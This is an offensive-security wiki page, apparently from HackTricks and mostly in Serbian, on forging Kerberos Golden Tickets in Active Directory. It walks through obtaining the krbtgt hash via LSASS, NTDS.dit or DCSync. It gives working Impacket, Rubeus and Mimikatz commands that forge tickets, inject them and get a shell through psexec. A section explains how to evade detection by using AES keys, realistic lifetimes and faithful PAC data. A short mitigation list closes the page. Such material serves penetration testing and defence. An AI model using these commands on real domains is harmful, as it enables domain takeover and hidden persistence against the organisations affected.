# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** napad se sastoji od **kreiranja legitimnog Ticket Granting Ticket (TGT) koji impersonira bilo kog korisnika** kroz upotrebu **NTLM hash-a Active Directory (AD) krbtgt naloga**. Ova tehnika je posebno korisna jer **omogućava pristup bilo kom servisu ili mašini** unutar domena kao impersonirani korisnik. Ključno je zapamtiti da se **credentials krbtgt naloga nikada ne ažuriraju automatski**.

Da bi se **pribavio NTLM hash** krbtgt naloga, mogu se koristiti različite metode. Može se izdvojiti iz procesa **Local Security Authority Subsystem Service (LSASS)** ili iz **NT Directory Services (NTDS.dit)** fajla koji se nalazi na bilo kom Domain Controller (DC) unutar domena. Takođe, **izvođenje DCsync napada** je još jedna strategija za dobijanje ovog NTLM hash-a, a može se izvršiti korišćenjem alata kao što je **lsadump::dcsync module** u Mimikatz-u ili **secretsdump.py skripta** u Impacket-u. Važno je naglasiti da je za izvođenje ovih operacija obično potrebno **domain admin privilegije ili sličan nivo pristupa**.

Iako NTLM hash predstavlja održivu metodu za ovu svrhu, **preporučuje se** da se **ticket-i izrađuju koristeći Advanced Encryption Standard (AES) Kerberos ključeve (AES128 i AES256)** iz razloga operativne bezbednosti. Ovo je još važnije u modernim domenima jer se **RC4 upotreba postepeno ukida** i znatno je uočljivija u Kerberos telemetry.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Modern ticket crafting notes

Kada je moguće, **prvo upituj LDAP i SYSVOL** a zatim forge-uj ticket koristeći stvarnu domain policy i user PAC vrednosti umesto da ih ručno izmišljaš:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` traži od DC korisnika, grupu, NetBIOS i policy podatke koji se koriste za izgradnju realističnijeg PAC.
- `/printcmd` ispisuje offline command line koji sadrži preuzeta PAC polja, što je korisno ako kasnije želiš da forge-uješ isti ticket bez ponovnog pristupanja LDAP-u.
- `/extendedupndns` dodaje novije `UpnDns` PAC elemente koji sadrže `samAccountName` i account SID.
- `/oldpac` uklanja novije `Requestor` i `Attributes` PAC buffers; ovo je uglavnom korisno za compatibility testing protiv starijih okruženja, a ne za default tradecraft.

Sa Linuxa, novije Impacket verzije takođe podržavaju dodavanje novijih PAC struktura i podešavanje realnog validity perioda:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` je u **satima**. Podrazumevana vrednost je **10 godina**, što je upadljivo.
- `-extra-pac` dodaje novije `UPN_DNS` PAC informacije.
- `-old-pac` forsira legacy PAC layout.
- `-extra-sid` je koristan kada PAC treba dodatne SID-ove (na primer, u scenarijima child-to-parent escalation, koji su obrađeni u [SID-History Injection](sid-history-injection.md)).

**Once** you have the **golden Ticket injected**, možete pristupiti deljenim fajlovima **(C$)** i izvršavati services i WMI, pa možete koristiti **psexec** ili **wmiexec** da dobijete shell (izgleda da ne možete dobiti shell preko winrm).

### Bypassing common detections

Najčešći način da se otkrije golden ticket je **inspecting Kerberos traffic** na mreži. Podrazumevano, Mimikatz **potpisuje TGT na 10 godina**, što će se izdvojiti kao anomalija u narednim TGS zahtevima koji se njime prave.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Koristite parametre `/startoffset`, `/endin` i `/renewmax` da kontrolišete start offset, duration i maksimum obnove (sve u minutima).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Nažalost, TGT-ov lifetime nije logovan u 4769 događajima, tako da ovu informaciju nećete pronaći u Windows event logovima. Međutim, ono što možete korelisati jeste **viđenje 4769 događaja bez prethodnog 4768**. **Nije moguće zahtevati TGS bez TGT-a**, i ako ne postoji zapis da je TGT izdat, možemo zaključiti da je bio forged offline.

U **novijim Windows buildovima**, Event ID-jevi **4768** i **4769** takođe izlažu mnogo bolje **encryption type telemetry**. Forged TGT/TGS koji koristi **RC4 (`0x17`)** u domenu gde `krbtgt`, klijenti i servisi već imaju AES ključeve mnogo je lakše uočiti nego pre nekoliko godina. To je još jedan razlog da se preferiraju **AES-backed Golden Tickets** i da se što bliže uskladi sa uobičajenom Kerberos politikom domena.

Još jedan OPSEC problem je **PAC fidelity**. Tiketi sa nemogućim članstvima u grupama, nedostajućim novijim PAC bufferima ili account metadata-om koji se ne poklapa sa LDAP-om lakše se detektuju kada defanzivci validiraju PAC sadržaj protiv AD podataka. Ako vam treba TGT koji izgleda kao da ga je zaista izdao DC, pogledajte:

{{#ref}}
diamond-ticket.md
{{#endref}}

Postoje i **environmental limits** za persistence. `krbtgt` account čuva **password history od 2**, tako da forged TGT može ostati validan kroz **prvi** `krbtgt` reset ako je potpisan prethodnim ključem. Zbog toga defanzivci poništavaju Golden Tickets tako što **resetuju `krbtgt` dva puta** i čekaju bar maksimalni lifetime tiketa domena između resetovanja.

Da biste **zaobišli ovu detekciju** proverite diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Još neki mali trikovi koje defanzivci mogu da primene su **alert na 4769 događaje za sensitive users** kao što je default domain administrator account i alert na **RC4 usage za `krbtgt`** u domenima koji normalno izdaju AES tikete.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
